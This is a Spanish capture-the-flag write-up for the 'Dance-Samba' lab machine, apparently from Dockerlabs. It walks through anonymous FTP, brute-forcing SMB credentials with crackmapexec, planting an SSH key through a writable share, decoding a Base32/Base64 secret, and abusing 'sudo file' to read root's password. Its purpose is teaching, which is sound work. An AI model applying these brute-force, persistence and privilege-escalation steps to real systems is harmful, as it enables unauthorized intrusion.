# Dance-Samba

**Nivel:** Medio

**Autor:** [d1se0](https://github.com/D1se0)

------------------
## Escaneo 

Relizamos un escaneo general con **nmap** en la IP de la máquina víctima para identificar los puertos abiertos. 

```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
________________________________________________
PORT   STATE SERVICE REASON
21/tcp  open  ftp          syn-ack ttl 64
22/tcp  open  ssh          syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64

```

A continuación, utilizamos los scripts predeterminados de **nmap** para recopilar más información sobre los puertos identificados:

```shell
nmap -sCV -p21,22,139,445 -Pn -n 172.17.0.2
________________________________________________
PORT   STATE SERVICE VERSION
21/tcp  open  ftp         vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              69 Aug 19 18:03 nota.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a2:4e:66:7d:e5:2e:cf:df:54:39:b2:08:a9:97:79:21 (ECDSA)
|_  256 92:bf:d3:b8:20:ac:76:08:5b:93:d7:69:ef:e7:59:e1 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-01-08T23:50:22
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

Encontramos los servicios **FTP**, **SSH** y **SMB**, y como podemos observar en la respuesta el servicio **FTP** permite conexión anónima.

------------------
## Enumeración 

Realizamos la conexión vía **FTP**, teniendo en cuenta que el usuario es **anonymous**, cuando el prompt solicita el password unicamente presionamos `Enter`:

```shell
ftp ftp://anonymous@172.17.0.2

```

Realizamos una verificación de los ficheros del directorio del servicio **FTP**:

```shell
ls -la
------------------------------------
229 Entering Extended Passive Mode (|||34822|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 19 18:03 .
drwxr-xr-x    2 0        0            4096 Aug 19 18:03 ..
-rw-r--r--    1 0        0              69 Aug 19 18:03 nota.txt
226 Directory send OK.
```

Encontramos el fichero **nota.txt** lo descargamos, cerramos la conexión **FTP** y procedemos a inspecionar el contenido descargado:

```shell
get nota.txt
------------------------------------
local: nota.txt remote: nota.txt
229 Entering Extended Passive Mode (|||32003|)
150 Opening BINARY mode data connection for nota.txt (69 bytes).
100% |*****************************************************************************************|    69      209.91 KiB/s    00:00 ETA
226 Transfer complete.
69 bytes received in 00:00 (77.89 KiB/s)
```

```shell
exit
------------------------------------
221 Goodbye.
```

```shell
cat nota.txt
------------------------------------
I don't know what to do with Macarena, she's obsessed with donald.

```

Hemos encontrado al parecer datos que podrian ser usuarios **macarena** y **donald**.

--------------
## Explotación

Creamos un fichero con los datos `macarena` y `donald` y procedemos a realizar ataques de fuerza bruta a los servicios **SMB** con **crackmapexec** y **SSH** con **hydra**:

```shell
crackmapexec smb 172.17.0.2 -u users.txt -p /usr/share/seclists/Passwords/500-worst-passwords.txt

```
Encontramos unas credenciales válidas para el servicio **SMB**.

Con las credenciales obtenidas realizamos una verificación de los recursos (shares) compartidos utilizando **smbmap**:

```shell
smbmap -H 172.17.0.2 -u macarena -p donald
-------------------------------------------
[+] IP: 172.17.0.2:445  Name: 172.17.0.2                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  READ ONLY       Printer Drivers
        macarena                                                READ, WRITE
        IPC$                                                    NO ACCESS       IPC Service (ec2518c014ba server (Samba, Ubuntu))
```

Observamos que podemos acceder con permisos de escritura al directorio **macarena**:

```shell
smbclient //172.17.0.2/macarena -U macarena%donald

```

Realizamos una verificación del directorio compartido y considerando los ficheros encontrados podemos deducir que es directorio personal del usuario.

```shell
ls
-----------------------------------
  .                                   D        0  Wed Jan  8 19:59:34 2025
  ..                                  D        0  Wed Jan  8 19:59:34 2025
  .bash_logout                        H      220  Mon Aug 19 11:18:51 2024
  .bash_history                       H      301  Wed Jan  8 19:31:42 2025
  user.txt                            N       33  Mon Aug 19 11:20:25 2024
  .bashrc                             H     3771  Mon Aug 19 11:18:51 2024
  .profile                            H      807  Mon Aug 19 11:18:51 2024
  .cache                             DH        0  Mon Aug 19 11:40:39 2024
```

Ahora para poder realizar la conexión vía **SSH** al servicio vamos a generar una key y luego la subimos al directorio personal del usuario:

```shell
ssh-keygen -t rsa -b 4096 -f /media/sf_Dockerlabs/dance-samba/id_rsa

```
Para subir la key al directorio de usuario y luego poder usarla para conectarnos vía **SSH** realizmos manualmente lo que hace **ssh-copy-id** copiar la llave pública la fichero `authorized_keys`:

Renombramos la llave pública: 

```shell
mv id_rsa.pub authorized_keys 
```

Creamos el directorio `.ssh` en el directorio personal del usuario **macarena**, ingresamos al usuario y subimos el fichero **authorized_keys**

```shell
mkdir .ssh
cd .ssh
put authorized_keys
--------------------
putting file authorized_keys as \.ssh\authorized_keys (358.9 kb/s) (average 358.9 kb/s)
 
```

Procedemos a ingresar a la máquina víctima usando **SSH**:

```shell
ssh -i id_rsa macarena@172.17.0.2
```

------------------------------
## Escalando privilegios

Desconocemos el password del usuario **macarena** por tanto 

verificamos los ficheros con el [**setuid**](https://es.wikipedia.org/wiki/Setuid) habilitado

```shell
find / -perm -4000 -type f 2>/dev/null
------------------------------------------------
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/sudo
```

Sin embargo, no encontramos mecanismo para escalar privilegios, procedemos a revisar los ficheros del sistema `\opt`, `\home`:

```shell
ls -la /opt
--------------
-rw------- 1 root root   16 Aug 19 19:21 password.txt
```

Encontramos el fichero **password.txt** sin embargo está restringido solo para el usuario **root**.

```shell
ls -la /home
--------------
drwxr-xr-x 2 root     root     4096 Aug 19 19:03 ftp
drwxr-x--- 1 macarena macarena 4096 Jan  9 02:07 macarena
drwxr-xr-x 2 root     root     4096 Aug 19 19:24 secret
```

Encontramos un directorio **secret** procedemos a inspeccionar el contenido:

```shell
ls -la /home/secret/
--------------
-rw-r--r-- 1 root root   49 Aug 19 19:24 hash
```

Hemos encontrado el fichero **hash** verificamos el contenido y encontramos una cadena que parece ser un hash:

```shell
cat /home/secret/hash
--------------
MMZVM522LBFHUWSXJYYWG3KWO5MVQTT2MQZDS6K2IE6T2===
```

Luego de realizar varias pruebas encontramos que la cadena está codificada en **Base32** y luego en **Base64** procedemos a decodificarla:

```shell
cat /home/secret/hash | base32 --decode | base64 --decode
```

Tenemos un valor que puede una contraseña verificamos si corresponde al usuario **macarena** o al usuario **root**:

```shell
su macarena
```

Hemos obtenido el password del usuario **macarena**, ahora si podemos verificar si existe algún binario que podamos ejecutar como super usuario con **sudo -l**

```shell
sudo -l
----------------------
User macarena may run the following commands on ec2518c014ba:
    (ALL : ALL) /usr/bin/file

```

Observamos que podemos ejecutar **/usr/bin/file** con todos los privilegios, esto indica que podemos leer el contenido del fichero **password.txt** que encontramos en **/opt**, revisamos la documentación de [GTFOBins for file](https://gtfobins.github.io/gtfobins/file/#sudo)

```shell
LFILE=/opt/password.tx
sudo file -f $LFILE
```

Encontramos las credenciales del usuario **root**, procedemos a autenticarnos:

```shell
su root
```

Finalmente hemos podido obtener acceso como usuario **root**:

```shell
whoami
----------------
root
```

